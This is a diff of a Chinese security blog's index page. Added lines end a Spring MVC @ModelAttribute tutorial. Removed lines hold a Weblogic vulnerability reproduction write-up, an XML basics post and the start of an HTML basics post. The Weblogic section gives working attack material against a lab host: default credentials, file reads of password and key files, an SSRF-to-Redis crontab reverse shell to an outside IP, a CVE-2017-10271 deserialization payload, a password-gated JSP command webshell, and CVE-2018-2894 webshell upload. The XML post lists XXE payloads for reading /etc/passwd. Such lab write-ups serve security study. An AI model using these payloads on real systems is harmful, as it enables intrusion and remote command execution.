+</code></pre><p>使用@ModelAttribute注解            </p>
+<pre><code>@ModelAttribute
+public void model(Model model) {
+    model.addAttribute(&quot;message&quot;, &quot;注解成功&quot;);
+}
+
+@RequestMapping(&quot;/value&quot;)
+public String handleRequest() {
+    return &quot;test1&quot;;
+}
+</code></pre><p>这样程序就会在调用该控制器所有的方法前,调用model()方法将message添加到页面参数中去,在视图中可直接调用。</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h4><p><a href="https://my.oschina.net/gaussik/blog/385697" target="_blank" rel="noopener">https://my.oschina.net/gaussik/blog/385697</a><br><a href="http://how2j.cn/k/springmvc/springmvc-springmvc/615.html" target="_blank" rel="noopener">http://how2j.cn/k/springmvc/springmvc-springmvc/615.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/10/ssm基础之Spring/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2032,1490 +3640,11 @@ c.&lt;jsp:include&gt;标签运行原理与RequestDispatcher.include()方法类�
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/12/Weblogic 漏洞复现/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/12/Weblogic 漏洞复现/" itemprop="url">Weblogic 漏洞复现</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-12T08:15:41+08:00">
-                2018-11-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h2 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h2><p>访问漏洞url：</p>
-<pre><code>https://cirt.net/passwords?criteria=weblogic
-默认账号密码:weblogic  Oracle@123
-</code></pre><p>访问<code>console</code>进入后台登陆页面,进入后台的方式一般是弱口令登陆,如果没有弱口令,可以配合前台文件读取来获取配置文件对密码进行解密。<br>这里提供了一个前台文件读取,访问<code>http://192.168.181.129:7001/hello/file.jsp?path=/etc/passwd</code>,在浏览器访问可直接下载,在burp中可对文件进行读取。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.33.47-image.png" alt="2018-11-11.15.33.47-image.png"></p>
-<h4 id="读取后台用户密文与密钥文件"><a href="#读取后台用户密文与密钥文件" class="headerlink" title="读取后台用户密文与密钥文件"></a>读取后台用户密文与密钥文件</h4><p>Weblogic密码使用AES(老版本3DES)加密,对称加密可解密,只需要找到用户的密文及加密密钥即可。这两个文件均位于<code>base_domain</code>下,名为<code>SerializedSystemIni.dat</code>和<code>config.xml</code>,在本环境中为<code>./security/SerializedSystemIni.dat</code>和<code>./config/config.xml</code>(基于当前目录<code>/root/Oracle/Middleware/user_projects/domains/base_domain</code>)<br>读取密钥:<br><code>SerializedSystemIni.dat</code>是一个二进制文件,所以必须用burp进行读取,浏览器直接下载可能造成乱码,我们在burp中右键保存为文件即可<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.26.48-image.png" alt="2018-11-11.15.26.48-image.png"></p>
-<p>读取密文:<br><code>config.xml</code>是base_domain的全局配置文件,其中的<code>&lt;node-manager-password-encrypted&gt;</code>的值即为加密后的管理员密码:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.28.21-image.png" alt="2018-11-11.15.28.21-image.png"></p>
-<p>解密:</p>
-<pre><code>1.dat文件
-{AES}yvGnizbUS0lga6iPA5LkrQdImFiS/DJ8Lw/yeE7Dt0k=
-</code></pre><p>登陆上去部署getshell:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.52.53-image.png" alt="2018-11-11.16.52.53-image.png"></p>
-<p>点击安装后,选择上载文件:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.54.10-image.png" alt="2018-11-11.16.54.10-image.png"></p>
-<p>打包war文件(当前目录下有shell文件z.jsp)    </p>
-<pre><code>jar -cvf zzz.war *
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.56.15-image.png" alt="2018-11-11.16.56.15-image.png"></p>
-<p>得到war文件,上载成功后一直点下一步至完成即可<br>最后得到:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.57.55-image.png" alt="2018-11-11.16.57.55-image.png"></p>
-<p>访问我们的shell：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.50.54-image.png" alt="2018-11-11.16.50.54-image.png"></p>
-<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><p>访问漏洞地址:    </p>
-<pre><code>http://192.168.181.129:7001/uddiexplorer/SearchPublicRegistries.jsp
-</code></pre><p>服务存在:    </p>
-<pre><code>http://192.168.181.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.181.129:7001
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.11.37.33-image.png" alt="2018-11-11.11.37.33-image.png"></p>
-<p>服务不存在:    </p>
-<pre><code>http://192.168.181.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.181.129:7002    
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.11.38.55-image.png" alt="2018-11-11.11.38.55-image.png"></p>
-<p>通过内网探测redis服务器,(docker的网段一般是<code>172.*</code>),发现<code>172.21.0.2:6379</code>可以连通。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.11.47.34-image.png" alt="2018-11-11.11.47.34-image.png"></p>
-<p>redis服务存在,我们可利用ssrf攻击内网中的redis服务器来反弹shell(<code>%0D%0A</code>分割命令)    </p>
-<p>发送3条命令：    </p>
-<pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/x.x.x.x/22 0&gt;&amp;1\n\n\n\n&quot;
-config set dir /etc/
-config set dbfilename crontab
-save
-</code></pre><p>经过url编码:    </p>
-<pre><code>aa%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F123.206.20.104%2F22%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
-</code></pre><p>payload：    </p>
-<pre><code>http://192.168.181.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.21.0.2:6379/aa%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F123.206.20.104%2F22%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
-</code></pre><p>成功反弹shell：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.12.30.17-image.png" alt="2018-11-11.12.30.17-image.png"></p>
-<h2 id="XMLDecoder反序列化漏洞-CVE-2017-10271"><a href="#XMLDecoder反序列化漏洞-CVE-2017-10271" class="headerlink" title="XMLDecoder反序列化漏洞_CVE-2017-10271"></a>XMLDecoder反序列化漏洞_CVE-2017-10271</h2><p>访问url:    </p>
-<pre><code>http://192.168.181.129:7001/wls-wsat/CoordinatorPortType
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.12.54.09-image.png" alt="2018-11-11.12.54.09-image.png"><br>看到这个页面,则说明可能存在此漏洞    </p>
-<p>构造数据包:    </p>
-<pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
-Host: 192.168.181.129:7001
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-DNT: 1
-Cookie: JSESSIONID=RfdGbnjhgpxTT7ThQ6hnYQKzLkLBjFLvGp1n10zpvypLKBYkHGkY!-709784728
-Connection: close
-Content-Type: text/xml
-Content-Length: 637
-
-&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;
-&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
-&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
-&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
-&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
-&lt;void index=&quot;0&quot;&gt;
-&lt;string&gt;/bin/bash&lt;/string&gt;
-&lt;/void&gt;
-&lt;void index=&quot;1&quot;&gt;
-&lt;string&gt;-c&lt;/string&gt;
-&lt;/void&gt;
-&lt;void index=&quot;2&quot;&gt;
-&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/22 0&amp;gt;&amp;amp;1&lt;/string&gt;  
-&lt;/void&gt;
-&lt;/array&gt;
-&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
-&lt;/java&gt;
-&lt;/work:WorkContext&gt;
-&lt;/soapenv:Header&gt;
-&lt;soapenv:Body/&gt;
-&lt;/soapenv:Envelope&gt;
-</code></pre><p>注意:    </p>
-<pre><code>Content-Type: text/xml
-</code></pre><p>反弹shell成功：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.12.56.33-image.png" alt="2018-11-11.12.56.33-image.png"></p>
-<p>写shell:    </p>
-<pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
-Host: 192.168.181.129:7001
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-DNT: 1
-Cookie: JSESSIONID=RfdGbnjhgpxTT7ThQ6hnYQKzLkLBjFLvGp1n10zpvypLKBYkHGkY!-709784728
-Connection: close
-Content-Type: text/xml
-Content-Length: 637
-
-&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
-    &lt;soapenv:Header&gt;
-    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
-    &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
-    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; 
-    &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;
-    &lt;void method=&quot;println&quot;&gt;&lt;string&gt;
-    &lt;![CDATA[
-&lt;%
-if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))
-{
-    java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;z&quot;)).getInputStream();
-    int a = -1;
-    byte[] b = new byte[2048];
-    out.print(&quot;&lt;pre&gt;&quot;);
-    while((a=in.read(b))!=-1)
-    {
-        out.println(new String(b));
-    }
-    out.print(&quot;&lt;/pre&gt;&quot;);
-}
-%&gt;
-    ]]&gt;
-    &lt;/string&gt;
-    &lt;/void&gt;
-    &lt;void method=&quot;close&quot;/&gt;
-    &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;
-    &lt;/work:WorkContext&gt;
-    &lt;/soapenv:Header&gt;
-    &lt;soapenv:Body/&gt;
-&lt;/soapenv:Envelope&gt;
-</code></pre><p>然后带密码访问:    </p>
-<pre><code>http://192.168.181.129:7001/bea_wls_internal/test.jsp
-POST:pwd=123&amp;z=ipconfig
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.14.59.13-image.png" alt="2018-11-11.14.59.13-image.png"></p>
-<h2 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h2><p>需要开启Web Service Test Page,但是默认是不开启的,所以有一定的限制,利用该漏洞可直接上传webshell,获取服务器权限</p>
-<p>在docker中查看管理员密码:</p>
-<pre><code>docker-compose logs | grep password
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.44.08-image.png" alt="2018-11-11.17.44.08-image.png"></p>
-<p>得到账户密码:</p>
-<pre><code>weblogic     nnXPlDo0
-</code></pre><p>访问<code>http://192.168.181.129:7001/console</code><br>点击<code>base_domain</code>配置,在高级中开启<code>&quot;启用Web服务测试页&quot;</code><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.41.24-image.png" alt="2018-11-11.17.41.24-image.png"></p>
-<p>点击保存后,访问<code>http://192.168.181.129:7001/ws_utc/config.do</code><br>将<code>Work Home Dir</code>改为:<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。访问这个目录是不需要权限的。这一点对我们访问我们的shell文件很重要。    </p>
-<p>保存完成后,点击<code>安全</code>–&gt;增加,然后上传webshell:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.51.55-image.png" alt="2018-11-11.17.51.55-image.png"></p>
-<p>上传查看返回包,得到时间戳(后面会用)<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.38.58-image.png" alt="2018-11-11.17.38.58-image.png"></p>
-<p>访问我们的shell:</p>
-<pre><code>http://192.168.181.129:7001/ws_utc/css/config/keystore/1541928959531_z.jsp
-pwd=023&amp;z=id
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.39.26-image.png" alt="2018-11-11.17.39.26-image.png"></p>
-<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><h2 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h2><p>还没复现,先放这里</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/08/java_web_xml/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/08/java_web_xml/" itemprop="url">基础知识 | XML基础</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-08T08:15:41+08:00">
-                2018-11-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><p>XML是一种用于标记电子文件使其具有结构性的标记语言，用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
-<p>xml<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-05.14.32.24-image.png" alt="2018-11-05.14.32.24-image.png"></p>
-<p>与html区别:    </p>
-<pre><code>a.html主要用于显示数据,而xml是为了传输与存储数据的
-b.html是不区分大小写的,而xml严格区分大小写
-c.html有多个根元素,格式良好的xml只有一个根元素
-d.html的空格自动过滤,xml的空格不会自动删除
-e.html的标签是预定义的,而xml的标记可以根据需要自定义,且可扩展
-</code></pre><p>文档声明    </p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;    
-</code></pre><p>元素定义:<code>&lt;城市&gt;临汾&lt;/城市&gt;</code>就是文档中的标记,如果一个元素没有嵌套在其他元素内且没有包含内容,这样的元素称为空元素。</p>
-<p>属性定义:<code>&lt;售价 单位=&quot;元&quot;&gt;10&lt;/售价&gt;</code>,这里的单位即为属性,属性的命名规范与元素相同,属性值必须用”或’引起来,否则会报错<br>注释:与html的注释符一样<code>&lt;!--注释信息-- &gt;</code></p>
-<h3 id="DTD约束："><a href="#DTD约束：" class="headerlink" title="DTD约束："></a>DTD约束：</h3><p>dtd约束是早期出现的一种XML约束模式语言,根据其约束的语法创建的文件称为DTD文件。</p>
-<pre><code>xml文件:
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE 书架 SYSTEM &quot;test.dtd&quot;&gt;
-&lt;书架&gt;
-    &lt;书&gt;
-        &lt;书名&gt;java&lt;/书名&gt;
-        &lt;作者&gt;admin&lt;/作者&gt;
-        &lt;售价&gt;100&lt;/售价&gt;
-    &lt;/书&gt;
-&lt;/书架&gt;
-
-dtd文件:
-&lt;!ELEMENT 书架 (书+)&gt;
-&lt;!ELEMENT 书 (书名,作者,售价)&gt;
-&lt;!ELEMENT 书名 (#PCDATA)&gt;
-&lt;!ELEMENT 作者 (#PCDATA)&gt;
-&lt;!ELEMENT 售价 (#PCDATA)&gt;
-</code></pre><h4 id="DTD文件的引用"><a href="#DTD文件的引用" class="headerlink" title="DTD文件的引用"></a>DTD文件的引用</h4><p>a.引用本地<code>dtd</code>文件:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-05.15.45.34-image.png" alt="2018-11-05.15.45.34-image.png"></p>
-<p>b.引用外部<code>dtd</code>文件:<br>&lt;!DOCTYPE a SYSTEM “<a href="http://www.xxx.cn/test.dtd&quot;&gt;" target="_blank" rel="noopener">http://www.xxx.cn/test.dtd&quot;&gt;</a></p>
-<p>c.内嵌DTD内容:</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--standalone:是否依赖于外部文件--&gt;
-&lt;!DOCTYPE 书架 [
-    &lt;!ELEMENT 书架 (书+)&gt;
-    &lt;!ELEMENT 书 (书名,作者,售价)&gt;
-    &lt;!ELEMENT 书名 (#PCDATA)&gt;
-    &lt;!ELEMENT 作者 (#PCDATA)&gt;
-    &lt;!ELEMENT 售价 (#PCDATA)&gt;
-]&gt;
-&lt;书架&gt;
-    &lt;书&gt;
-        &lt;书名&gt;java&lt;/书名&gt;
-        &lt;作者&gt;admin&lt;/作者&gt;
-        &lt;售价&gt;100&lt;/售价&gt;
-    &lt;/书&gt;
-&lt;/书架&gt;
-</code></pre><p>在渗透过程中,xxe漏洞常利用的payload:</p>
-<pre><code>#读取etc/passwd文件:
-&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
-&lt;!DOCTYPE a [ &lt;!ENTITY % d SYSTEM &quot;http://www.xxx.cn/attack.dtd&quot;&gt; %d; ]&gt;
-&lt;!DOCTYPE a SYSTEM &quot;http://www.xxx.cn/attack.dtd&quot;&gt;
-
-DTD文件:
-&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
-</code></pre><h3 id="Schema约束"><a href="#Schema约束" class="headerlink" title="Schema约束"></a>Schema约束</h3><p>同DTD一样,XML Schema也是一种用于定义和描述XML文档结构与内容的模式语言。它克服了DTD的一些局限性。</p>
-<pre><code>a.DTD采用的是非XML语法格式,缺乏对文档元素,结构,数据类型的全面描述,而Schema本身采用的就是xml语法格式
-b.DTD本身合法性的验证采用的是另一套机制,而XML Schema则采用与XML文档相同的合法性验证机制
-c.支持命名空间,张三.书架 张三就为命名空间
-d.
-</code></pre><p>XML Schema:</p>
-<pre><code>定义可出现在文档中的元素
-定义可出现在文档中的属性
-定义哪个元素是子元素
-定义子元素的次序
-定义子元素的数目
-定义元素是否为空，或者是否可包含文本
-定义元素和属性的数据类型
-定义元素和属性的默认值以及固定值
-</code></pre><p>最简单的Schema文档:</p>
-<pre><code>#Simple.xsd
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;xs:schema xmlns:xs=&quot;http://w3.org/2001/XMLSchema&quot;&gt;
-    &lt;xs:element name=&quot;root&quot; type=&quot;xs:string&quot; /&gt;
-&lt;/xs:schema&gt;
-</code></pre><p><code>xs:schema</code>是根元素,表示模式定义的开始,由于<code>xs:schema</code>的属性都在<code>http://w3.org/2001/XMLSchema</code>的名称空间,因此,在根元素必须声明该名称空间.</p>
-<h4 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间:"></a>名称空间:</h4><p>举个简单例子便于理解:</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;it315:书架 xmlns:it315=&quot;http://www.it315.org/xmlbook/schema&quot;&gt;
-    &lt;it315:书&gt;
-        &lt;it315:书名&gt;java&lt;/it315:书名&gt;
-        &lt;it315:作者&gt;admin&lt;/it315:作者&gt;
-        &lt;it315:售价&gt;28:00rmb&lt;/it315:售价&gt;
-    &lt;/it315:书&gt;
-&lt;/it315:书架&gt;
-</code></pre><p>名称空间的应用就是将前缀(<code>it315</code>)与一个<code>URI(http://www.it315.org/xmlbook/schema)</code>关联起来</p>
-<h4 id="引入Schema文档"><a href="#引入Schema文档" class="headerlink" title="引入Schema文档"></a>引入Schema文档</h4><p>若想通过XML Schema文件对某个xml文件进行约束时,必须将XML文档与Schema文件进行关联。在xml文档引入Schema文件有使用名称空间及不使用名称空间2种方法.</p>
-<pre><code>#使用空间名称
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;书架 xmls=&quot;http://www.it315.org/xmlbook/schema&quot;   //引入xmls
-      xmls:demo=&quot;http://www.it315.org/demo/schema&quot; //引入xmls下的demo
-      xmls:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  //引入xmls下的xsi
-      xsi:schemaLocation=&quot;http://www.it315.org/xmlbook/schema   //xsi名称空间名
-                          http://www.it315.org/xmlbook.xsd        //文档位置
-                          http://www.it315.org/demo/schema        //demo名称空间名
-                          http://www.it315.org/demo.xsd&quot;&gt;        //文档位置
-      &lt;书&gt;
-        &lt;书名&gt;java&lt;/书名&gt;
-        &lt;作者&gt;admin&lt;/作者&gt;
-        &lt;售价 demo:币种=&quot;人民币&quot;&gt;11&lt;/售价&gt;
-      &lt;/书&gt;
-
-&lt;/书架&gt;
-
-
-#不使用空间名称 xmlbook.xsd与test.xml位于同一目录中
-test.xml
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;书架 xmls:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
-      xsi:noNamespaceSchemaLocation=&quot;xmlbook.xsd&quot;&gt;
-      &lt;书&gt;
-        &lt;书名&gt;java&lt;/书名&gt;
-        &lt;作者&gt;admin&lt;/作者&gt;
-        &lt;售价&gt;11&lt;/售价&gt;
-      &lt;/书&gt;
-
-&lt;/书架&gt;
-</code></pre><p>更多元素与语法参考:<a href="http://www.w3school.com.cn/schema/schema_elements_ref.asp" target="_blank" rel="noopener">XML Schema 参考手册</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/07/java_web_前端基础/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/07/java_web_前端基础/" itemprop="url">基础知识 | 前端基础知识</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-07T08:15:41+08:00">
-                2018-11-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>HTML,超文本标记语言,主要作用是通过HTML标记对网页中文本,图片,声音等进行描述。<br>一个最基本的html文档:</p>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;This is title&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p>各个标签:    </p>
-<pre><code>单双标记:&lt;hr /&gt;  &lt;html&gt;&lt;/html&gt;    
-段落：&lt;p&gt;&lt;/p&gt;     
-换行:&lt;br /&gt;
-文本样式:&lt;font face=&quot;微软雅黑&quot; size=&quot;7&quot; color=&quot;green&quot;&gt;&lt;br /&gt;文本1&lt;/font&gt;
-图像:&lt;img src=&quot;/1.jpg&quot; width=&quot;100&quot; height=&quot;111&quot; border=&quot;0&quot; /&gt;
-表格：//使得网页中的数据能够有条理地显示,可使用表格对网页进行规划
-&lt;table&gt;//表格
-    &lt;tr&gt;//行
-        &lt;td&gt;单元格&lt;/td&gt;//列
-        &lt;td&gt;单元格1&lt;/td&gt;
-        &lt;td&gt;单元格2&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;单元格4&lt;/td&gt;
-        &lt;td&gt;单元格5&lt;/td&gt;
-        &lt;td&gt;单元格6&lt;/td&gt;
-    &lt;/tr&gt;
-&lt;/table&gt;
-
-表单:由表单控件,提示信息,表单域3部分组成
